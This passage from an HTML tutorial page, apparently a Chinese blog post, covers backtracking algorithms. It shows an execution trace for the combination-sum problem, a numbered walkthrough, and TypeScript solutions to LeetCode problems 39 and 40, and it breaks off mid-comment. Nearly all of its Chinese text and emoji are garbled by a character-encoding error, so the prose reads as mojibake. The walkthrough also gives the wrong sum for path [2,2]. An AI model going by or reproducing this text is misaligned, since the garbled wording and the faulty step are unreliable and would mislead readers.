      ğŸ” ã€å±‚çº§4ã€‘ éå†i=0 â†’ å°è¯•é€‰æ•°å­—2ï¼Œå½“å‰sum=6
      ğŸš« ã€å±‚çº§4ã€‘ æ’åºå‰ªæ â†’ 6+2=8 &gt; 7ï¼Œbreakå¾ªç¯
      ğŸ”´ ã€å±‚çº§4ã€‘ è¿”å›é˜¶æ®µ â†’ forå¾ªç¯ç»“æŸï¼Œå›åˆ°ä¸Šä¸€å±‚
    ğŸ”´ ã€å±‚çº§3ã€‘ è¿”å›é˜¶æ®µ â†’ ä»ä¸‹ä¸€å±‚è¿”å›ï¼Œç»§ç»­æ‰§è¡Œ
    ğŸ”µ ã€å±‚çº§3ã€‘ æ’¤é”€é˜¶æ®µ â†’ æ’¤é”€æ•°å­—2 â†’ path=[2,2], sum=4
    ğŸ” ã€å±‚çº§3ã€‘ éå†i=1 â†’ å°è¯•é€‰æ•°å­—3ï¼Œå½“å‰sum=4
    âœ… ã€å±‚çº§3ã€‘ é€‰æ•°å­—3 â†’ path=[2,2,3], sum=7
    ğŸŸ¡ ã€å±‚çº§3ã€‘ æš‚åœé˜¶æ®µ â†’ è°ƒç”¨ä¸‹ä¸€å±‚backtrackï¼Œç­‰å¾…è¿”å›
      ğŸŸ¢ ã€å±‚çº§4ã€‘ è°ƒç”¨é˜¶æ®µ â†’ path=[2,2,3], sum=7, start=1
      âœ… ã€å±‚çº§4ã€‘ æ‰¾åˆ°æœ‰æ•ˆç»„åˆ â†’ [2,2,3]ï¼Œresult=[[2,2,3]]
      ğŸ”´ ã€å±‚çº§4ã€‘ è¿”å›é˜¶æ®µ â†’ æ‰¾åˆ°è§£ï¼Œå›åˆ°ä¸Šä¸€å±‚
    ğŸ”´ ã€å±‚çº§3ã€‘ è¿”å›é˜¶æ®µ â†’ ä»ä¸‹ä¸€å±‚è¿”å›ï¼Œç»§ç»­æ‰§è¡Œ
    ğŸ”µ ã€å±‚çº§3ã€‘ æ’¤é”€é˜¶æ®µ â†’ æ’¤é”€æ•°å­—3 â†’ path=[2,2], sum=4
    ğŸ” ã€å±‚çº§3ã€‘ éå†i=2 â†’ å°è¯•é€‰æ•°å­—7ï¼Œå½“å‰sum=4
    ğŸš« ã€å±‚çº§3ã€‘ æ’åºå‰ªæ â†’ 4+7=11 &gt; 7ï¼Œbreakå¾ªç¯
    ğŸ”´ ã€å±‚çº§3ã€‘ è¿”å›é˜¶æ®µ â†’ forå¾ªç¯ç»“æŸï¼Œå›åˆ°ä¸Šä¸€å±‚
  ğŸ”´ ã€å±‚çº§2ã€‘ è¿”å›é˜¶æ®µ â†’ ä»ä¸‹ä¸€å±‚è¿”å›ï¼Œç»§ç»­æ‰§è¡Œ
  ğŸ”µ ã€å±‚çº§2ã€‘ æ’¤é”€é˜¶æ®µ â†’ æ’¤é”€æ•°å­—2 â†’ path=[2], sum=2
  ğŸ” ã€å±‚çº§2ã€‘ éå†i=1 â†’ å°è¯•é€‰æ•°å­—3ï¼Œå½“å‰sum=2
  âœ… ã€å±‚çº§2ã€‘ é€‰æ•°å­—3 â†’ path=[2,3], sum=5
  ğŸŸ¡ ã€å±‚çº§2ã€‘ æš‚åœé˜¶æ®µ â†’ è°ƒç”¨ä¸‹ä¸€å±‚backtrackï¼Œç­‰å¾…è¿”å›
    ğŸŸ¢ ã€å±‚çº§3ã€‘ è°ƒç”¨é˜¶æ®µ â†’ path=[2,3], sum=5, start=1
    ğŸ” ã€å±‚çº§3ã€‘ éå†i=1 â†’ å°è¯•é€‰æ•°å­—3ï¼Œå½“å‰sum=5
    ğŸš« ã€å±‚çº§3ã€‘ æ’åºå‰ªæ â†’ 5+3=8 &gt; 7ï¼Œbreakå¾ªç¯
    ğŸ”´ ã€å±‚çº§3ã€‘ è¿”å›é˜¶æ®µ â†’ forå¾ªç¯ç»“æŸï¼Œå›åˆ°ä¸Šä¸€å±‚
  ğŸ”´ ã€å±‚çº§2ã€‘ è¿”å›é˜¶æ®µ â†’ ä»ä¸‹ä¸€å±‚è¿”å›ï¼Œç»§ç»­æ‰§è¡Œ
  ğŸ”µ ã€å±‚çº§2ã€‘ æ’¤é”€é˜¶æ®µ â†’ æ’¤é”€æ•°å­—3 â†’ path=[2], sum=2
  ğŸ” ã€å±‚çº§2ã€‘ éå†i=2 â†’ å°è¯•é€‰æ•°å­—7ï¼Œå½“å‰sum=2
  ğŸš« ã€å±‚çº§2ã€‘ æ’åºå‰ªæ â†’ 2+7=9 &gt; 7ï¼Œbreakå¾ªç¯
  ğŸ”´ ã€å±‚çº§2ã€‘ è¿”å›é˜¶æ®µ â†’ forå¾ªç¯ç»“æŸï¼Œå›åˆ°ä¸Šä¸€å±‚
ğŸ”´ ã€å±‚çº§1ã€‘ è¿”å›é˜¶æ®µ â†’ ä»ä¸‹ä¸€å±‚è¿”å›ï¼Œç»§ç»­æ‰§è¡Œ
ğŸ”µ ã€å±‚çº§1ã€‘ æ’¤é”€é˜¶æ®µ â†’ æ’¤é”€æ•°å­—2 â†’ path=[], sum=0
ğŸ” ã€å±‚çº§1ã€‘ éå†i=1 â†’ å°è¯•é€‰æ•°å­—3ï¼Œå½“å‰sum=0
âœ… ã€å±‚çº§1ã€‘ é€‰æ•°å­—3 â†’ path=[3], sum=3
ğŸŸ¡ ã€å±‚çº§1ã€‘ æš‚åœé˜¶æ®µ â†’ è°ƒç”¨ä¸‹ä¸€å±‚backtrackï¼Œç­‰å¾…è¿”å›
  ğŸŸ¢ ã€å±‚çº§2ã€‘ è°ƒç”¨é˜¶æ®µ â†’ path=[3], sum=3, start=1
  ğŸ” ã€å±‚çº§2ã€‘ éå†i=1 â†’ å°è¯•é€‰æ•°å­—3ï¼Œå½“å‰sum=3
  âœ… ã€å±‚çº§2ã€‘ é€‰æ•°å­—3 â†’ path=[3,3], sum=6
  ğŸŸ¡ ã€å±‚çº§2ã€‘ æš‚åœé˜¶æ®µ â†’ è°ƒç”¨ä¸‹ä¸€å±‚backtrackï¼Œç­‰å¾…è¿”å›
    ğŸŸ¢ ã€å±‚çº§3ã€‘ è°ƒç”¨é˜¶æ®µ â†’ path=[3,3], sum=6, start=1
    ğŸ” ã€å±‚çº§3ã€‘ éå†i=1 â†’ å°è¯•é€‰æ•°å­—3ï¼Œå½“å‰sum=6
    ğŸš« ã€å±‚çº§3ã€‘ æ’åºå‰ªæ â†’ 6+3=9 &gt; 7ï¼Œbreakå¾ªç¯
    ğŸ”´ ã€å±‚çº§3ã€‘ è¿”å›é˜¶æ®µ â†’ forå¾ªç¯ç»“æŸï¼Œå›åˆ°ä¸Šä¸€å±‚
  ğŸ”´ ã€å±‚çº§2ã€‘ è¿”å›é˜¶æ®µ â†’ ä»ä¸‹ä¸€å±‚è¿”å›ï¼Œç»§ç»­æ‰§è¡Œ
  ğŸ”µ ã€å±‚çº§2ã€‘ æ’¤é”€é˜¶æ®µ â†’ æ’¤é”€æ•°å­—3 â†’ path=[3], sum=3
  ğŸ” ã€å±‚çº§2ã€‘ éå†i=2 â†’ å°è¯•é€‰æ•°å­—7ï¼Œå½“å‰sum=3
  ğŸš« ã€å±‚çº§2ã€‘ æ’åºå‰ªæ â†’ 3+7=10 &gt; 7ï¼Œbreakå¾ªç¯
  ğŸ”´ ã€å±‚çº§2ã€‘ è¿”å›é˜¶æ®µ â†’ forå¾ªç¯ç»“æŸï¼Œå›åˆ°ä¸Šä¸€å±‚
ğŸ”´ ã€å±‚çº§1ã€‘ è¿”å›é˜¶æ®µ â†’ ä»ä¸‹ä¸€å±‚è¿”å›ï¼Œç»§ç»­æ‰§è¡Œ
ğŸ”µ ã€å±‚çº§1ã€‘ æ’¤é”€é˜¶æ®µ â†’ æ’¤é”€æ•°å­—3 â†’ path=[], sum=0
ğŸ” ã€å±‚çº§1ã€‘ éå†i=2 â†’ å°è¯•é€‰æ•°å­—7ï¼Œå½“å‰sum=0
âœ… ã€å±‚çº§1ã€‘ é€‰æ•°å­—7 â†’ path=[7], sum=7
ğŸŸ¡ ã€å±‚çº§1ã€‘ æš‚åœé˜¶æ®µ â†’ è°ƒç”¨ä¸‹ä¸€å±‚backtrackï¼Œç­‰å¾…è¿”å›
  ğŸŸ¢ ã€å±‚çº§2ã€‘ è°ƒç”¨é˜¶æ®µ â†’ path=[7], sum=7, start=2
  âœ… ã€å±‚çº§2ã€‘ æ‰¾åˆ°æœ‰æ•ˆç»„åˆ â†’ [7]ï¼Œresult=[[2,2,3],[7]]
  ğŸ”´ ã€å±‚çº§2ã€‘ è¿”å›é˜¶æ®µ â†’ æ‰¾åˆ°è§£ï¼Œå›åˆ°ä¸Šä¸€å±‚
ğŸ”´ ã€å±‚çº§1ã€‘ è¿”å›é˜¶æ®µ â†’ ä»ä¸‹ä¸€å±‚è¿”å›ï¼Œç»§ç»­æ‰§è¡Œ
ğŸ”µ ã€å±‚çº§1ã€‘ æ’¤é”€é˜¶æ®µ â†’ æ’¤é”€æ•°å­—7 â†’ path=[], sum=0
ğŸ”´ ã€å±‚çº§1ã€‘ è¿”å›é˜¶æ®µ â†’ forå¾ªç¯ç»“æŸï¼Œå›åˆ°ä¸Šä¸€å±‚
========== æ‰§è¡Œç»“æŸ ==========
æœ€ç»ˆç»“æœï¼š [ [ 2, 2, 3 ], [ 7 ] ]
</code></pre>
<h4 data-id="heading-9">æ‰§è¡Œæµç¨‹è§£æ</h4>
<p>ä»¥ <code>candidates = [2,3,7]</code>, <code>target = 7</code> ä¸ºä¾‹ï¼š</p>
<ol>
<li><strong>é€‰2</strong> â†’ path=[2], sum=2 â†’ <strong>é’»åˆ°åº•</strong>ï¼ˆé€’å½’ï¼‰</li>
<li><strong>é€‰2</strong> â†’ path=[2,2], sum=4 â†’ <strong>é’»åˆ°åº•</strong>ï¼ˆé€’å½’ï¼‰</li>
<li><strong>é€‰2</strong> â†’ path=[2,2,2], sum=6 â†’ <strong>é’»åˆ°åº•</strong>ï¼ˆé€’å½’ï¼‰</li>
<li><strong>é€‰2</strong> â†’ sum=8 &gt; 7ï¼Œå‰ªæï¼Œ<strong>é€€å›æ¥</strong></li>
<li><strong>åˆ æ‰2</strong> â†’ path=[2,2], sum=6 â†’ <strong>é€‰ä¸‹ä¸€ä¸ªæ•°3</strong></li>
<li><strong>é€‰3</strong> â†’ path=[2,2,3], sum=7 âœ… æ‰¾åˆ°è§£ï¼Œ<strong>é€€å›æ¥</strong></li>
<li><strong>åˆ æ‰3</strong> â†’ path=[2,2], sum=6 â†’ <strong>é€‰ä¸‹ä¸€ä¸ªæ•°7</strong></li>
<li>å‰ªæï¼Œ<strong>é€€å›æ¥</strong> â†’ path=[2], sum=2 â†’ ç»§ç»­å°è¯•...</li>
<li>æœ€ç»ˆæ”¶é›†åˆ° <code>[[2,2,3],[7]]</code></li>
</ol>
<h3 data-id="heading-10">ä¸‰ã€å›æº¯ç®—æ³•å¸¸è§é¢˜å‹åŠè§£é¢˜æ–¹æ³•</h3>
<h4 data-id="heading-11">1. ç»„åˆé—®é¢˜</h4>
<h5 data-id="heading-12">æ ¸å¿ƒç‰¹å¾</h5>
<ul>
<li>ä¸è€ƒè™‘å…ƒç´ é¡ºåºï¼Œæ¯ä¸ªç»„åˆå”¯ä¸€ï¼ˆå¦‚<code>[2,3]</code>å’Œ<code>[3,2]</code>ç®—åŒä¸€ä¸ªï¼‰</li>
<li>ç”¨<code>start</code>å‚æ•°æ§åˆ¶"ä¸å›å¤´é€‰"ï¼Œé¿å…ç”Ÿæˆé‡å¤ç»„åˆ</li>
<li>æ•°å­—å¯é‡å¤é€‰ï¼ˆç»„åˆæ€»å’Œï¼‰/ä¸å¯é‡å¤é€‰ï¼ˆç»„åˆï¼‰ï¼Œä»…éœ€è°ƒæ•´<code>start</code>å‚æ•°ï¼ˆé‡å¤é€‰ä¼ <code>i</code>ï¼Œä¸é‡å¤é€‰ä¼ <code>i+1</code>ï¼‰</li>
</ul>
<h5 data-id="heading-13">LeetCode é¢˜ç›®è¯¦è§£</h5>
<h6 data-id="heading-14"><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fcombination-sum%2F" target="_blank" title="https://leetcode.cn/problems/combination-sum/" ref="nofollow noopener noreferrer">39. ç»„åˆæ€»å’Œ</a></h6>
<p><strong>é¢˜ç›®æè¿°ï¼š</strong></p>
<p>ç»™å®šä¸€ä¸ª<strong>æ— é‡å¤å…ƒç´ </strong>çš„æ•´æ•°æ•°ç»„ <code>candidates</code> å’Œä¸€ä¸ªç›®æ ‡æ•´æ•° <code>target</code>ï¼Œæ‰¾å‡º <code>candidates</code> ä¸­å¯ä»¥ä½¿æ•°å­—å’Œä¸ºç›®æ ‡æ•° <code>target</code> çš„<strong>æ‰€æœ‰ä¸åŒç»„åˆ</strong>ï¼Œå¹¶ä»¥åˆ—è¡¨å½¢å¼è¿”å›ã€‚ä½ å¯ä»¥æŒ‰<strong>ä»»æ„é¡ºåº</strong>è¿”å›è¿™äº›ç»„åˆã€‚</p>
<p><code>candidates</code> ä¸­çš„<strong>åŒä¸€ä¸ªæ•°å­—å¯ä»¥æ— é™åˆ¶é‡å¤è¢«é€‰å–</strong>ã€‚å¦‚æœè‡³å°‘ä¸€ä¸ªæ•°å­—çš„è¢«é€‰æ•°é‡ä¸åŒï¼Œåˆ™ä¸¤ç§ç»„åˆæ˜¯ä¸åŒçš„ã€‚</p>
<p><strong>ç¤ºä¾‹ 1ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">è¾“å…¥ï¼š<span class="hljs-attr">candidates</span> = [<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>], target = <span class="hljs-number">7</span>
è¾“å‡ºï¼š<span class="hljs-section">[[2,2,3]</span>,<span class="hljs-section">[7]]</span>
è§£é‡Šï¼š
2 å’Œ 3 å¯ä»¥å½¢æˆä¸€ç»„å€™é€‰ï¼Œ2 + 2 + <span class="hljs-attr">3</span> = <span class="hljs-number">7</span>ã€‚æ³¨æ„ <span class="hljs-number">2</span> å¯ä»¥ä½¿ç”¨å¤šæ¬¡ã€‚
7 ä¹Ÿæ˜¯ä¸€ä¸ªå€™é€‰ï¼Œ <span class="hljs-attr">7</span> = <span class="hljs-number">7</span>ã€‚
æ‰€ä»¥è¿™ä¸¤ç§ç»„åˆæ˜¯å”¯ä¸€çš„ç­”æ¡ˆã€‚
</code></pre>
<p><strong>ç¤ºä¾‹ 2ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">è¾“å…¥: <span class="hljs-attr">candidates</span> = [<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>], target = <span class="hljs-number">8</span>
è¾“å‡º: <span class="hljs-section">[[2,2,2,2]</span>,<span class="hljs-section">[2,3,3]</span>,<span class="hljs-section">[3,5]]</span>
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//**</span>
 * ç»„åˆæ€»å’Œï¼šæ‰¾å‡ºå€™é€‰æ•°ç»„ä¸­æ‰€æœ‰å’Œä¸ºç›®æ ‡å€¼çš„ç»„åˆï¼ˆæ•°å­—å¯é‡å¤é€‰å–ï¼‰
 * @param candidates æ— é‡å¤å…ƒç´ çš„å€™é€‰æ•°å­—æ•°ç»„
 * @param target ç›®æ ‡å’Œ
 * @returns æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„ç»„åˆæ•°ç»„
 */
<span class="hljs-keyword">function</span> <span class="hljs-title function_">combinationSum</span>(<span class="hljs-params">candidates: number[], target: number</span>): number[][] {
  <span class="hljs-comment">// ç»“æœæ•°ç»„ï¼šå­˜å‚¨æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„ç»„åˆï¼ˆéœ€æ·±æ‹·è´ï¼Œé¿å…å¼•ç”¨æ±¡æŸ“ï¼‰</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">res</span>: number[][] = [];
  <span class="hljs-comment">// å€™é€‰æ•°ç»„é•¿åº¦ï¼šé¿å…å¾ªç¯ä¸­é‡å¤è®¡ç®—</span>
  <span class="hljs-keyword">const</span> len = candidates.<span class="hljs-property">length</span>;

  <span class="hljs-comment">// ã€æ˜“é”™ç‚¹1ã€‘æ’åºæ˜¯å‰ªæçš„å‰æï¼æ— åºæ•°ç»„æ— æ³•ç”¨breakæœ‰æ•ˆå‰ªæ</span>
  candidates.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x - y);

  <span class="hljs-comment">/**
   * å›æº¯æ ¸å¿ƒå‡½æ•°
   * <span class="hljs-doctag">@param</span> path å½“å‰å·²é€‰æ•°å­—çš„è·¯å¾„ï¼ˆå¼•ç”¨ç±»å‹ï¼Œéœ€æ³¨æ„å›æº¯æ’¤é”€ï¼‰
   * <span class="hljs-doctag">@param</span> sum å½“å‰è·¯å¾„çš„æ•°å­—å’Œï¼ˆé¿å…é‡å¤è®¡ç®—ï¼Œæå‡æ•ˆç‡ï¼‰
   * <span class="hljs-doctag">@param</span> start éå†èµ·å§‹ç´¢å¼•ï¼ˆæ§åˆ¶ä¸å›å¤´é€‰ï¼Œé¿å…é‡å¤ç»„åˆï¼‰
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">backtrack</span>(<span class="hljs-params">path: number[], sum: number, start: number</span>) {
    <span class="hljs-comment">// ç»ˆæ­¢æ¡ä»¶1ï¼šæ‰¾åˆ°æœ‰æ•ˆç»„åˆ</span>
    <span class="hljs-keyword">if</span> (sum === target) {
      <span class="hljs-comment">// ã€æ˜“é”™ç‚¹2ã€‘å¿…é¡»æ·±æ‹·è´ï¼ç›´æ¥push(path)ä¼šå› å¼•ç”¨å¯¼è‡´åç»­popä¿®æ”¹ç»“æœ</span>
      res.<span class="hljs-title function_">push</span>([...path]);
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// ç»ˆæ­¢æ¡ä»¶2ï¼šå‰ç½®å‰ªæï¼ˆsumè¶…è¿‡ç›®æ ‡å€¼ï¼Œç›´æ¥ç»ˆæ­¢å½“å‰é€’å½’ï¼‰</span>
    <span class="hljs-comment">// å¯é€‰ä¼˜åŒ–ï¼šå¯åˆå¹¶ä¸º if (sum &gt;= target) { ... return }</span>
    <span class="hljs-keyword">if</span> (sum &gt; target) {
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// éå†å€™é€‰æ•°ç»„ï¼ˆä»startå¼€å§‹ï¼Œé¿å…é‡å¤ç»„åˆï¼‰</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = start; i &lt; len; i++) {
      <span class="hljs-keyword">const</span> cur = candidates[i];

      <span class="hljs-comment">// ã€æ‰§è¡Œé¡ºåºä¼˜åŒ–ç‚¹ã€‘å‰ªæé€»è¾‘åº”æ”¾åœ¨pushä¹‹å‰ï¼ˆå½“å‰ä»£ç pushååˆ¤æ–­ï¼Œä¼šå¤šä¸€æ¬¡æ— æ•ˆpush/popï¼‰</span>
      <span class="hljs-comment">// æ’åºåï¼Œè‹¥å½“å‰æ•°+å·²é€‰å’Œ&gt;ç›®æ ‡å€¼ï¼Œåç»­æ•°æ›´å¤§ï¼Œç›´æ¥ç»ˆæ­¢å¾ªç¯</span>
      <span class="hljs-keyword">if</span> (sum + cur &gt; target) {
        <span class="hljs-keyword">break</span>;
      }

      <span class="hljs-comment">// åšé€‰æ‹©ï¼šå°†å½“å‰æ•°å­—åŠ å…¥è·¯å¾„</span>
      path.<span class="hljs-title function_">push</span>(cur);

      <span class="hljs-comment">// ã€æ˜“é”™ç‚¹3ã€‘é€’å½’å‚æ•°ä¼ iè€Œéstartï¼</span>
      <span class="hljs-comment">// ä¼ iï¼šå…è®¸é‡å¤é€‰å½“å‰æ•°å­—ï¼ˆç»„åˆæ€»å’Œæ ¸å¿ƒéœ€æ±‚ï¼‰</span>
      <span class="hljs-comment">// ä¼ startï¼šæ— é™é€’å½’ï¼ˆæ°¸è¿œä»0å¼€å§‹é€‰ï¼‰ï¼Œä¼ i+1ï¼šä¸å…è®¸é‡å¤é€‰ï¼ˆå˜æˆç»„åˆé—®é¢˜ï¼‰</span>
      <span class="hljs-title function_">backtrack</span>(path, sum + cur, i);

      <span class="hljs-comment">// æ’¤é”€é€‰æ‹©ï¼šå›æº¯æ ¸å¿ƒï¼Œæ¢å¤è·¯å¾„çŠ¶æ€</span>
      path.<span class="hljs-title function_">pop</span>();
    }
  }

  <span class="hljs-comment">// åˆå§‹è°ƒç”¨ï¼šç©ºè·¯å¾„ã€å’Œä¸º0ã€ä»ç´¢å¼•0å¼€å§‹éå†</span>
  <span class="hljs-title function_">backtrack</span>([], <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
  <span class="hljs-keyword">return</span> res;
}

<span class="hljs-comment">// æµ‹è¯•ç”¨ä¾‹</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">combinationSum</span>([<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>], <span class="hljs-number">7</span>)); <span class="hljs-comment">// è¾“å‡ºï¼š[[2,2,3],[7]]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">combinationSum</span>([<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>], <span class="hljs-number">8</span>));   <span class="hljs-comment">// è¾“å‡ºï¼š[[2,2,2,2],[2,3,3],[3,5]]</span>
</code></pre>
<p><strong>æ˜“é”™ç‚¹ï¼š</strong></p>
<ul>
<li>å¿˜è®°æ’åºå¯¼è‡´å‰ªæå¤±æ•ˆ</li>
<li><code>start</code>å‚æ•°ä¼ é”™ï¼ˆé‡å¤é€‰ä¼ <code>i</code>ï¼Œä¸é‡å¤é€‰ä¼ <code>i+1</code>ï¼‰</li>
<li>å¿˜è®°æ‹·è´è·¯å¾„ï¼ˆ<code>[...path]</code>ï¼‰</li>
</ul>
<hr/>
<h6 data-id="heading-15"><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fcombination-sum-ii%2F" target="_blank" title="https://leetcode.cn/problems/combination-sum-ii/" ref="nofollow noopener noreferrer">40. ç»„åˆæ€»å’Œ II</a></h6>
<p><strong>é¢˜ç›®æè¿°ï¼š</strong></p>
<p>ç»™å®šä¸€ä¸ªå€™é€‰äººç¼–å·çš„é›†åˆ <code>candidates</code> å’Œä¸€ä¸ªç›®æ ‡æ•° <code>target</code>ï¼Œæ‰¾å‡º <code>candidates</code> ä¸­æ‰€æœ‰å¯ä»¥ä½¿æ•°å­—å’Œä¸º <code>target</code> çš„ç»„åˆã€‚</p>
<p><code>candidates</code> ä¸­çš„<strong>æ¯ä¸ªæ•°å­—åœ¨æ¯ä¸ªç»„åˆä¸­åªèƒ½ä½¿ç”¨ä¸€æ¬¡</strong>ã€‚</p>
<p>**æ³¨æ„ï¼š**è§£é›†ä¸èƒ½åŒ…å«é‡å¤çš„ç»„åˆã€‚</p>
<p><strong>ç¤ºä¾‹ 1ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">è¾“å…¥: <span class="hljs-attr">candidates</span> = [<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>], target = <span class="hljs-number">8</span>,
è¾“å‡º:
<span class="hljs-section">[
[1,1,6]</span>,
<span class="hljs-section">[1,2,5]</span>,
<span class="hljs-section">[1,7]</span>,
<span class="hljs-section">[2,6]</span>
]
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/**
 * ç»„åˆæ€»å’ŒIIï¼šæ‰¾å‡ºå€™é€‰æ•°ç»„ä¸­æ‰€æœ‰å’Œä¸ºç›®æ ‡å€¼çš„ç»„åˆï¼ˆæ•°å­—ä¸å¯é‡å¤é€‰å–ï¼Œä¸”ç»“æœæ— é‡å¤ç»„åˆï¼‰
 * æ ¸å¿ƒåŒºåˆ«äºcombinationSumï¼š
 * 1. å€™é€‰æ•°ç»„å¯èƒ½åŒ…å«é‡å¤æ•°å­—
 * 2. æ¯ä¸ªæ•°å­—åœ¨æ¯ä¸ªç»„åˆä¸­åªèƒ½ä½¿ç”¨ä¸€æ¬¡
 * 3. æœ€ç»ˆç»“æœä¸èƒ½æœ‰é‡å¤ç»„åˆ
 * <span class="hljs-doctag">@param</span> candidates å¯èƒ½åŒ…å«é‡å¤å…ƒç´ çš„å€™é€‰æ•°å­—æ•°ç»„
 * <span class="hljs-doctag">@param</span> target ç›®æ ‡å’Œ
 * <span class="hljs-doctag">@returns</span> æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„ä¸é‡å¤ç»„åˆæ•°ç»„
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">combinationSum2</span>(<span class="hljs-params">candidates: <span class="hljs-built_in">number</span>[], target: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span>[][] {
  <span class="hljs-comment">// ç»“æœæ•°ç»„ï¼šå­˜å‚¨æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„ç»„åˆï¼ˆéœ€æ·±æ‹·è´ï¼Œé¿å…å¼•ç”¨æ±¡æŸ“ï¼‰</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">res</span>: <span class="hljs-built_in">number</span>[][] = [];
  <span class="hljs-comment">// å€™é€‰æ•°ç»„é•¿åº¦ï¼šé¿å…å¾ªç¯ä¸­é‡å¤è®¡ç®—</span>
  <span class="hljs-keyword">const</span> len = candidates.<span class="hljs-property">length</span>;

  <span class="hljs-comment">// ã€æ˜“é”™ç‚¹1ã€‘æ’åºæ˜¯å»é‡+å‰ªæçš„å‰æï¼æ— åºæ•°ç»„æ— æ³•æœ‰æ•ˆå»é‡å’Œå‰ªæ</span>
  candidates.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x - y);

  <span class="hljs-comment">/**
   * å›æº¯æ ¸å¿ƒå‡½æ•°
   * <span class="hljs-doctag">@param</span> path å½“å‰å·²é€‰æ•°å­—çš„è·¯å¾„ï¼ˆå¼•ç”¨ç±»å‹ï¼Œéœ€æ³¨æ„å›æº¯æ’¤é”€ï¼‰
   * <span class="hljs-doctag">@param</span> sum å½“å‰è·¯å¾„çš„æ•°å­—å’Œï¼ˆé¿å…é‡å¤è®¡ç®—ï¼Œæå‡æ•ˆç‡ï¼‰
   * <span class="hljs-doctag">@param</span> start éå†èµ·å§‹ç´¢å¼•ï¼ˆæ§åˆ¶ä¸å›å¤´é€‰ï¼Œé¿å…é‡å¤ç»„åˆï¼‰
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">backtrack</span>(<span class="hljs-params">path: <span class="hljs-built_in">number</span>[], sum: <span class="hljs-built_in">number</span>, start: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-comment">// ç»ˆæ­¢æ¡ä»¶1ï¼šæ‰¾åˆ°æœ‰æ•ˆç»„åˆ</span>
    <span class="hljs-keyword">if</span> (sum === target) {
      <span class="hljs-comment">// ã€æ˜“é”™ç‚¹2ã€‘å¿…é¡»æ·±æ‹·è´ï¼ç›´æ¥push(path)ä¼šå› å¼•ç”¨å¯¼è‡´åç»­popä¿®æ”¹ç»“æœ</span>
      res.<span class="hljs-title function_">push</span>([...path]);
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// ç»ˆæ­¢æ¡ä»¶2ï¼šå‰ç½®å‰ªæï¼ˆsumè¶…è¿‡ç›®æ ‡å€¼ï¼Œç›´æ¥ç»ˆæ­¢å½“å‰é€’å½’ï¼‰</span>
    <span class="hljs-keyword">if</span> (sum &gt; target) {
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// éå†å€™é€‰æ•°ç»„ï¼ˆä»startå¼€å§‹ï¼Œé¿å…é‡å¤ç»„åˆï¼‰</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = start; i &lt; len; i++) {
      <span class="hljs-keyword">const</span> cur = candidates[i];

      <span class="hljs-comment">// ã€æ ¸å¿ƒä¼˜åŒ–1ã€‘å…ˆå‰ªæï¼ˆsum+cur&gt;targetï¼‰ï¼Œå†å¤„ç†å»é‡ï¼Œé¿å…æ— æ•ˆæ“ä½œ</span>
      <span class="hljs-comment">// æ’åºåï¼Œè‹¥å½“å‰æ•°+å·²é€‰å’Œ&gt;ç›®æ ‡å€¼ï¼Œåç»­æ•°æ›´å¤§ï¼Œç›´æ¥ç»ˆæ­¢å¾ªç¯</span>
      <span class="hljs-keyword">if</span> (sum + cur &gt; target) {
        <span class="hljs-keyword">break</span>;
      }

      <span class="hljs-comment">// ã€æ˜“é”™ç‚¹3ã€‘å»é‡å‰ªæå¿…é¡»æ”¾åœ¨pushä¹‹å‰ï¼ä¸”åˆ¤æ–­æ¡ä»¶æ˜¯i&gt;start</span>
